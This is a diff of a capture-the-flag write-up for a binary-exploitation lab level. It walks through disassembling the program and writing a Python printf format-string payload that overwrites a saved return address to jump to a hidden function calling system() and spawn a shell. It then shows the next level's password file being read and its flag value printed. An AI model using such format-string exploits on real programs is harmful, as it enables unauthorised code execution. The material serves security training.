@@ -1,11 +1,28 @@
-After decompilation, we see a function `o()` that executes a shell.
+$ ./level5
+=> (Wait for an input)
+$ dsahkjdhsf
+=> dsahkjdhsf
+=> (Close standard input)
 
-Function `o()` address is 0x080484a4.
+I disas the <main>
+$ gdb level5
+$ (gdb) disas main
+there's only a call to the function <n> :
+   0x0804850a <+6>:	call   0x80484c2 <n>
+$ (gdb) disas n
+    0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+    0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
 
-Since function o is never called, we have to call it ourself.
-For that, we plan to overwrite EIP register in printf call.
+the function <n> is only calling those two functions but, in the objdump:
+$ objdump -d level5
+  080484a4 <o>:
+    80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
+We can find the function <o> that is never called and has a call to system that executes a shell.
+Since function <o> is never called, we have to call it ourself.
+For that, we plan to overwrite EIP register thanks to the printf call in the <n> function.
 
-After printf function call, there is an exit function call.
+Though, after the call of <printf>, there is a call to the <exit> function.
 So if we overwrite EIP in n function stack frame, our overwritten EIP will never
 be restored.
 
@@ -16,10 +33,20 @@ In printf function, EIP is stored at address 0xbffff50c.
 
 ```python
 #! /usr/bin/env python
-
 M_ADDR          = "\x0c\xf5\xff\xbf"
-PAD             = "%x "*2
-OVERWRITE       = "%134513810x %n"
+OVERWRITE       = "%134513824x"
+N               = "%4$n"
 
-print M_ADDR + PAD + OVERWRITE
+print M_ADDR + OVERWRITE + N
 ```
+
+The script above writes the payload we will give to our binary ./level5
+
+$ python script.py > /tmp/payload
+$ cat /tmp/payload | ./level5
+=>                            [...]                                                      200
+
+and we now have access to the shell that will allow us to get the flag :
+
+$ cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
